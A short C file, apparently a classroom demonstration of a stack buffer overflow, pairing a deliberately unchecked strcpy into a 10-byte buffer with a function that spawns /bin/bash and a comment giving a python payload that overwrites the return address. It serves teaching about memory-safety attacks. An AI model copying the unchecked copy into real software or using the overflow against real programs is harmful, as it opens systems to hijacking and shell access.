#include "stdio.h"
#include "string.h"

/*readme
// run the example by:
./rop_1 "$(python -c 'print "A"*0x12 + "BBBB" + "\x6b\x84\x04\x08"')"

// NOTE: the address "\x6b\x84\x04\x08" should be updated with the address for the malicious code in your local machine
// To find out the address of the malicious code, please use gdb

*/

/*malicious code created by attackers*/
void malicious_code() {
    printf("malicious code is invoked\n");
    system("/bin/bash");
}

/*regular code with vulnerable function, created by careless programmer*/
void vulnerable_function(char* string) {
    char buffer[10];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    vulnerable_function(argv[1]);
    return 0;
}
